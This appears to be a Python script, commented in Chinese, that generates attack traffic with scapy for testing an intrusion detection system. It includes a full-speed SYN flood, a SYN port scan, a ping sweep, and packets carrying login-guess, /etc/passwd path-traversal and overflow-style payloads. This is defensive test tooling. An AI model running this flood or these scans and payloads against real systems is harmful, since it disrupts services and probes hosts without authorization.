"""
网络攻击流量模拟器
用于生成测试流量以验证入侵检测系统
注意：仅用于授权测试，请勿用于非法用途！
"""
import argparse
import time
import random
import sys
import socket
from scapy.all import IP, TCP, UDP, ICMP, send, conf  # type: ignore

def syn_flood(target_ip, port, count):
    """
    模拟 SYN Flood (DoS攻击)
    发送大量伪造的 TCP SYN 数据包
    """
    print(f"\n[DoS] 正在启动 SYN Flood 攻击 -> {target_ip}:{port}")
    print(f"发送 {count} 个数据包...")
    
    for i in range(count):
        # 随机源端口
        src_port = random.randint(1024, 65535)
        # 随机序列号
        seq = random.randint(1000, 9000)
        
        # 构造 SYN 包
        # 注意：为了让本地 IDS 捕获，我们通常发送到真实 IP 或 localhost
        pkt = IP(dst=target_ip) / TCP(dport=port, sport=src_port, flags="S", seq=seq)
        
        send(pkt, verbose=0)
        
        if (i + 1) % 100 == 0:
            sys.stdout.write(f"\r已发送: {i + 1}/{count}")
            sys.stdout.flush()
            
        # 移除延时，全速发送以模拟真实DoS
        # time.sleep(0.02) 
        
    print("\n[DoS] 攻击模拟完成")

def port_scan(target_ip):
    """
    模拟端口扫描 (Probe攻击)
    扫描常用端口
    """
    print(f"\n[Probe] 正在启动端口扫描 -> {target_ip}")
    
    # 常用端口列表
    common_ports = [
        21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 
        443, 445, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080
    ]
    
    print(f"扫描 {len(common_ports)} 个常用端口...")
    
    for i, port in enumerate(common_ports):
        src_port = random.randint(1024, 65535)
        
        # 构造 SYN 包 (半连接扫描)
        pkt = IP(dst=target_ip) / TCP(dport=port, sport=src_port, flags="S")
        
        send(pkt, verbose=0)
        print(f"扫描端口: {port}")
        
        time.sleep(0.1)
        
    print("[Probe] 扫描模拟完成")

def ping_sweep(target_ip_prefix):
    """
    模拟 Ping Sweep (Probe攻击)
    扫描网段存活主机
    """
    print(f"\n[Probe] 正在启动 Ping Sweep -> {target_ip_prefix}.*")
    
    # 扫描前20个IP
    for i in range(1, 21):
        target = f"{target_ip_prefix}.{i}"
        pkt = IP(dst=target) / ICMP()
        send(pkt, verbose=0)
        print(f"Ping: {target}")
        time.sleep(0.1)
        
    print("[Probe] Ping Sweep 模拟完成")

def r2l_attack(target_ip, port, count, interval=0.0):
    """
    模拟 R2L (Remote to Local) 攻击流量
    通过向常见的远程服务发送暴力登录或目录遍历等可疑有效载荷来模拟
    """
    print(f"\n[R2L] 正在启动 R2L 攻击 -> {target_ip}:{port}")
    print(f"发送 {count} 个攻击性有效载荷...")

    payloads = [
        b"USER root\r\n",
        b"PASS 123456\r\n",
        (f"GET /../../etc/passwd HTTP/1.1\r\nHost: {target_ip}\r\n\r\n").encode(),
        b"A" * 300,
    ]

    for i in range(count):
        src_port = random.randint(1024, 65535)
        payload = random.choice(payloads)
        pkt = IP(dst=target_ip) / TCP(dport=port, sport=src_port, flags="PA") / payload
        send(pkt, verbose=0)

        if (i + 1) % 100 == 0:
            sys.stdout.write(f"\r已发送: {i + 1}/{count}")
            sys.stdout.flush()

        # 加入小幅抖动的间隔，避免被误判为 DoS
        if interval and interval > 0:
            jitter = random.uniform(-interval * 0.1, interval * 0.1)
            time.sleep(max(0.0, interval + jitter))
    print("\n[R2L] 攻击模拟完成")

def u2r_attack(target_ip, port, count, interval=0.0):
    """
    模拟 U2R (User to Root) 攻击流量
    通过发送可能触发本地提权漏洞的可疑有效载荷到服务端口来模拟（仅流量层面）
    """
    print(f"\n[U2R] 正在启动 U2R 攻击 -> {target_ip}:{port}")
    print(f"发送 {count} 个攻击性有效载荷...")

    # U2R 应表现为少量但异常的大/畸形包，优先通过真实 TCP 连接发送载荷以避免被服务器拒绝
    payload_template = b"\x90" * 1200 + b"U2R_MARKER" + b"B" * 200

    for i in range(count):
        payload = payload_template + (b"#" + str(i).encode())

        # 优先使用标准 socket 建立真正的 TCP 连接并发送 payload（无需 root）
        sent_via_socket = False
        try:
            with socket.create_connection((target_ip, port), timeout=2) as sock:
                sock.sendall(payload)
                sent_via_socket = True
        except Exception:
            # 连接失败（端口关闭或被防火墙拒绝），回退到原始数据包发送
            sent_via_socket = False

        if not sent_via_socket:
            src_port = random.randint(40000, 60000)
            # 回退时使用常规 PSH+ACK 标志，避免使用异常标志导致 REJ
            tcp_seg = TCP(dport=port, sport=src_port, flags="PA", window=65535)
            pkt = IP(dst=target_ip, ttl=64) / tcp_seg / payload
            send(pkt, verbose=0)

        if (i + 1) % 50 == 0:
            sys.stdout.write(f"\r已发送: {i + 1}/{count}")
            sys.stdout.flush()

        # 加入较大间隔与小幅抖动，U2R 是低频触发型攻击
        if interval and interval > 0:
            jitter = random.uniform(-interval * 0.1, interval * 0.1)
            time.sleep(max(0.0, interval + jitter))

    print("\n[U2R] 攻击模拟完成")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="网络攻击流量模拟器")
    parser.add_argument("type", choices=["dos", "probe", "scan", "r2l", "u2r"], 
                        help="攻击类型: dos (SYN Flood), probe (端口扫描), scan (Ping扫描), r2l (Remote-to-Local), u2r (User-to-Root)")
    parser.add_argument("--target", default="127.0.0.1", help="目标IP (默认: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=80, help="目标端口 (仅DoS模式有效)")
    parser.add_argument("--count", type=int, default=200, help="包数量 (某些模式需小值，例如 r2l/u2r)")
    parser.add_argument("--interval", type=float, default=0.0, help="每次发送间隔（秒），r2l/u2r 推荐大于0）")
    
    args = parser.parse_args()
    
    try:
        # 如果是低频攻击类型且用户没有设置 interval，但 count 很大，自动使用较大间隔以避免被误判为 DoS
        interval = args.interval
        if args.type in ("r2l", "u2r") and interval == 0.0 and args.count > 50:
            print("[警告] r2l/u2r 模式下大量包可能被误判为 DoS，自动将间隔设置为 1.0s。如需高频请手动指定 --interval 0")
            interval = 1.0

        if args.type == "dos":
            syn_flood(args.target, args.port, args.count)
        elif args.type == "probe":
            port_scan(args.target)
        elif args.type == "scan":
            # 假设输入的是完整IP，提取前缀
            prefix = ".".join(args.target.split(".")[:3])
            ping_sweep(prefix)
        elif args.type == "r2l":
            r2l_attack(args.target, args.port, args.count, interval)
        elif args.type == "u2r":
            u2r_attack(args.target, args.port, args.count, interval)
            
    except PermissionError:
        print("\n错误: 需要 root 权限发送伪造数据包。请使用 sudo 运行。")
    except Exception as e:
        print(f"\n发生错误: {e}")
